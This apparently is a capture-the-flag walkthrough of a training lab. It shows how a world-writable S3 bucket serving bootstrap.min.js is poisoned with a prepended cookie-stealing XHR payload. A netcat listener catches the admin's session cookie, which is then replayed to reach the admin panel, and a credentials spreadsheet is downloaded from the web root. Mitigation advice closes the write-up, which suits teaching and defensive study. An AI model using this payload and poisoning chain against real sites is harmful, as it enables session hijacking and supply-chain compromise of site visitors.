# CTF Walkthrough: Leverage Writable S3 Bucket to Steal Admin Cookie

**Platform:** Pwnedlabs | **Environment:** AWS + On-Premise Web Server | **Difficulty:** Beginner | **IP:** 10.1.20.25

## Executive Summary

The lab simulates a real-world scenario where a phishing victim's credentials leak an SSH foothold and internal IP. Initial reconnaissance reveals a web application serving static assets from a publicly writable AWS S3 bucket. Two attack paths exist: **(1) Unintended shortcut** — the sensitive credentials XLSX file is served directly from the web root with no authentication; **(2) Intended vector** — the S3 bucket hosting JavaScript assets can be poisoned with XSS payload to steal the admin's session cookie when a Selenium/Chrome headless bot loads the page. The intended path demonstrates supply-chain poisoning and session hijacking in a real-world context.

---

## Reconnaissance

### Nmap

```bash
$ nmap -sV -p- 10.1.20.25
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 09:56 -0500

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Huge Logistics
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Analysis:** SSH and HTTP open. HTTP title "Huge Logistics" suggests a web application. Start with HTTP enumeration.

---

### SSH Access (Given Credentials)

From the phishing context, credentials `marco:hlpass99` are provided.

```bash
$ ssh marco@10.1.20.25
$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco)
```

**Analysis:** Unprivileged user. No sudo access.

### Web Root Enumeration

```bash
$ ls -la /var/www/html/
total 104
-rw-r--r--  1 root   root    1234 Apr  5 10:00 index.php
-rw-r--r--  1 root   root    2456 Apr  5 10:00 admin.php
-rw-r--r--  1 root   root    1890 Apr  5 10:00 home.php
-rw-r--r--  1 root   root     890 Apr  5 10:00 contact_me.php
-rw-r--r--  1 root   root     512 Apr  5 10:00 config.php
-rw-r--r--  1 root   root  45670 Apr  5 10:00 8e685ca5924cbe9d3cd27efcd29d8763.xlsx
```

**Key Finding:** A large `.xlsx` file accessible directly from the web root. This is the **unintended shortcut**.

### Source Code Review

```bash
$ cat /var/www/html/admin.php | grep -i "s3\|bucket\|css\|js"
```

**Key Findings:**
- `admin.php` includes `bootstrap.min.js` and `bootstrap.min.css` from `https://frontend-web-assets-8deaf0c2d067.s3.amazonaws.com/assets/`
- `home.php` includes the same S3 assets
- No `integrity=` (SRI) attributes on `<script>` tags

### /opt Directory Enumeration (Critical)

```bash
$ ls -la /opt/
total 24
drwxr-xr-x  2 root root 4096 Apr  5 09:00 selenium
-rwxr-xr-x  1 root root 1234 Apr  5 09:00 admin_bot.py
```

```bash
$ cat /opt/admin_bot.py
#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time

chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox")

driver = webdriver.Chrome(options=chrome_options)
driver.get("http://localhost/admin.php")
# Login logic here
driver.get("http://localhost/home.php")
time.sleep(5)
driver.quit()
```

**Critical Finding:** A Selenium bot runs HeadlessChrome to automate admin tasks, visiting `admin.php` and `home.php`. This confirms JavaScript execution in a real browser context.

### S3 Bucket Enumeration

```bash
$ aws s3 ls s3://frontend-web-assets-8deaf0c2d067/ --recursive --no-sign-request
2026-04-05 09:51:22      50564 assets/bootstrap.min.js
2026-04-05 09:51:22     127343 assets/bootstrap.min.css
2026-04-05 09:51:22      87462 assets/jquery-3.7.0.min.js
[... more assets ...]
```

**Permission Check:**

```bash
$ echo "test" > /tmp/test.txt
$ aws s3 cp /tmp/test.txt s3://frontend-web-assets-8deaf0c2d067/assets/test --no-sign-request
upload: /tmp/test.txt to s3://frontend-web-assets-8deaf0c2d067/assets/test
```

**Critical Finding:** S3 bucket is world-writable. Any file can be uploaded, allowing supply-chain poisoning of assets.

---

## Attack Path 1: Unintended Shortcut (XLSX Direct Access)

### Vulnerability Discovery

The credentials spreadsheet is served directly from the web root with no authentication requirement.

```bash
$ curl -s http://10.1.20.25/8e685ca5924cbe9d3cd27efcd29d8763.xlsx -o creds.xlsx
$ file creds.xlsx
creds.xlsx: Microsoft Excel 2007+ XML Spreadsheet, from 'Microsoft Excel'
```

### Exploitation

Simply download and read the XLSX file directly. No payload or session manipulation needed.

```bash
$ unzip -p creds.xlsx xl/worksheets/sheet1.xml | xmllint --format - | grep -oP '<v>\K[^<]+'
# Extract all cell values
jsmith
Pass1234!
svc_azureDB
svc$AzureDB#2023
[... 25 more credential rows ...]
8e685ca5924cbe9d3cd27efcd29d8763  # <-- FLAG
```

### Flag

```
Flag: 8e685ca5924cbe9d3cd27efcd29d8763
```

**Why This Works:** Developer mistake of placing sensitive files in the web root with no access control. HTTP requests don't require authentication, and the file is directly enumerable.

---

## Attack Path 2: Intended Vector (S3 Supply Chain XSS → Session Hijacking)

### Vulnerability Discovery

1. Static assets (`bootstrap.min.js`, `jquery-3.7.0.min.js`) are loaded from a world-writable S3 bucket
2. No SRI (Subresource Integrity) checks protect these files from tampering
3. Selenium bot executes JavaScript in a real browser context, including admin session cookies

### Exploitation Phase 1: Backup Original Asset

```bash
$ aws s3 cp s3://frontend-web-assets-8deaf0c2d067/assets/bootstrap.min.js bootstrap.min.js.bak --no-sign-request
download: s3://frontend-web-assets-8deaf0c2d067/assets/bootstrap.min.js to bootstrap.min.js.bak
$ wc -c bootstrap.min.js.bak
50564 bootstrap.min.js.bak
```

### Exploitation Phase 2: Craft XHR Payload

The payload must:
1. **Prepend** before legitimate JS content (not append)
2. Use vanilla `XMLHttpRequest` (simpler than `fetch()`, no CORS preflight)
3. Point to `localhost:8000` (bot runs on the server, not externally)
4. Include `document.cookie` as a URL query parameter

```javascript
var xhr=new XMLHttpRequest();
xhr.open("GET","http://localhost:8000/?"+document.cookie,true);
xhr.send();
```

### Exploitation Phase 3: Build Poisoned File

```bash
$ echo 'var xhr=new XMLHttpRequest();xhr.open("GET","http://localhost:8000/?"+document.cookie,true);xhr.send();' > bootstrap.min.js
$ cat bootstrap.min.js.bak >> bootstrap.min.js
$ wc -c bootstrap.min.js
50706 bootstrap.min.js  # Original 50564 + payload ~140 bytes
```

### Exploitation Phase 4: Start Listener on Target Server

The admin bot runs **locally on the server**, so the listener must bind to `localhost` on the target.

```bash
$ ssh marco@10.1.20.25
$ nc -lvnp 8000 > /tmp/cookie.txt 2>&1 &
Listening on 0.0.0.0 8000
```

### Exploitation Phase 5: Upload Poisoned Asset to S3

```bash
$ aws s3 cp bootstrap.min.js s3://frontend-web-assets-8deaf0c2d067/assets/bootstrap.min.js --no-sign-request
Completed 49.5 KiB/49.5 KiB (88.6 KiB/s) with 1 file(s) remaining
upload: ./bootstrap.min.js to s3://frontend-web-assets-8deaf0c2d067/assets/bootstrap.min.js
```

### Exploitation Phase 6: Wait for Admin Bot to Execute

The Selenium bot periodically visits the admin panel. When it loads `bootstrap.min.js`, our payload fires immediately.

```bash
$ cat /tmp/cookie.txt
Listening on 0.0.0.0 8000
Connection received on 127.0.0.1 45152
OPTIONS /?PHPSESSID=sbfe3uhqftpkiksu8mju74rhm8 HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.216 Safari/537.36
```

**Stolen Cookie:**
```
PHPSESSID=sbfe3uhqftpkiksu8mju74rhm8
```

### Exploitation Phase 7: Replay Cookie Against Admin Panel

```bash
$ curl -b "PHPSESSID=sbfe3uhqftpkiksu8mju74rhm8" http://10.1.20.25/home.php
[... HTML response ...]
<h1 class="login-title">Welcome Admin!</h1>
<p class="login-text">Export users</p>
<button type="submit" name="submit" class="btn btn-outline-primary">Export</button>
```

**Result:** Authenticated access to the admin panel.

### Exploitation Phase 8: Access Sensitive Functions

With the stolen admin session, export the user list (which contains the same 27 credentials from the XLSX).

```bash
$ curl -b "PHPSESSID=sbfe3uhqftpkiksu8mju74rhm8" http://10.1.20.25/home.php -d "submit=Export" > users.xls
```

### Cleanup: Restore Original Asset

```bash
$ aws s3 cp bootstrap.min.js.bak s3://frontend-web-assets-8deaf0c2d067/assets/bootstrap.min.js --no-sign-request
Completed 49.4 KiB/49.4 KiB (102.2 KiB/s) with 1 file(s) remaining
upload: bootstrap.min.js.bak to s3://frontend-web-assets-8deaf0c2d067/assets/bootstrap.min.js
```

---

## Root Cause Analysis

### Why the XLSX Was Vulnerable
- **Misconfiguration:** Sensitive file placed directly in web root without authentication
- **No Access Control:** No `.htaccess` or application-level checks to require login
- **Predictable Filename:** File uses a simple MD5 hash, which could be enumerated or leaked

**Mitigation:**
- Store sensitive files outside the web root
- Require authentication for sensitive endpoints
- Use unpredictable filenames
- Implement access control checks in the application

### Why the S3 Bucket Was Vulnerable
- **Public Write Permissions:** Bucket configured to allow anonymous `PutObject` requests
- **No SRI Checks:** Application doesn't enforce Subresource Integrity on static assets
- **Assumption of Trust:** Developers assumed assets on the same domain are trustworthy

**Mitigations:**
1. **S3 Bucket Policy:** Restrict write permissions to authenticated AWS IAM principals only
2. **SRI (Subresource Integrity):** Add `integrity=` attributes to all `<script>` and `<link>` tags with cryptographic hashes
3. **Content Security Policy (CSP):** Restrict XHR requests to the application's origin, blocking exfiltration to arbitrary servers
4. **HTTPS + HttpOnly Cookies:** Use HTTPS to prevent man-in-the-middle attacks and set `HttpOnly` on session cookies to prevent JavaScript access
5. **SameSite Cookie Attribute:** Set `SameSite=Strict` to prevent cross-origin cookie theft

---

## Key Lessons Learned

1. **Always enumerate `/opt` (and `/home`, `/srv`)** — Bot/automation scripts reveal the execution environment (real browser, headless, curl, etc.) before payload crafting
2. **Exfil channel direction matters** — If the bot runs on the target server, listener goes on the server and payload points to `localhost`, not the attacker's external IP
3. **Payload placement is critical** — XSS payloads must be prepended (before) legitimate content, not appended (after), to ensure early execution
4. **World-writable buckets + no SRI = supply-chain compromise** — This attack scales to all users visiting the site
5. **Session hijacking is powerful** — A stolen session cookie grants full authenticated access without needing to crack passwords

---

## Timeline

| Step | Action | Result |
|------|--------|--------|
| Recon | Nmap + SSH into 10.1.20.25 as marco | Access to web root and /opt |
| Unintended | Download `/8e685ca5924cbe9d3cd27efcd29d8763.xlsx` | Flag + 27 credential rows captured |
| Intended | Check `/opt/admin_bot.py` | Confirmed real browser (HeadlessChrome) executing JS |
| Intended | Test S3 bucket write permission | Confirmed world-writable bucket |
| Intended | Backup + poison `bootstrap.min.js` | Payload prepended, file uploaded |
| Intended | Start `nc -lvnp 8000` on target | Listener bound to localhost:8000 |
| Intended | Wait for bot execution | Cookie captured: `PHPSESSID=sbfe3uhqftpkiksu8mju74rhm8` |
| Intended | Replay cookie via curl | Authenticated access to `/home.php` |
| Cleanup | Restore original bootstrap.min.js | Asset sanitized |

---

## References

- **Session Hijacking:** https://owasp.org/www-community/attacks/Session_hijacking_attack
- **Supply Chain Attacks:** https://owasp.org/www-community/attacks/Supply_chain_attack
- **S3 Security:** https://docs.aws.amazon.com/AmazonS3/latest/userguide/security.html
- **SRI (Subresource Integrity):** https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
- **CSP (Content Security Policy):** https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
